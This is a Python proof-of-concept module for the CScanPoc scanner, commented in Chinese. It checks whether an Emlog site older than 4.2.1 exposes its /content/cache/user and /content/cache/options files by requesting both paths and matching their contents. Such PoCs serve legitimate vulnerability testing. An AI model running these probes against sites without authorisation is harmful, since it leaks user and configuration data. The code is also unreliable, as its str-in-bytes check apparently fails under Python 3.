# coding: utf-8
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Emlog_0101'  # 平台漏洞编号，留空
    name = 'Emlog <4.2.1 /content/cache/user 信息泄漏'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-12-09'  # 漏洞公布时间
    desc = '''
    漏洞文件：/content/cache/user ,  /content/cache/options.
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=02955'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Emlog'  # 漏洞应用名称
    product_version = '<4.2.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1ccd1aaf-5a84-4861-b333-9f541abd31a8'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload1 = '/content/cache/user'
            payload2 = '/content/cache/options'
            verify_url = self.target + payload1
            verify_url2 = self.target + payload2
            content = urllib.request.urlopen(verify_url).read()
            # options
            content2 = urllib.request.urlopen(verify_url2).read()
            if self.target in content2 and 'avatar' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
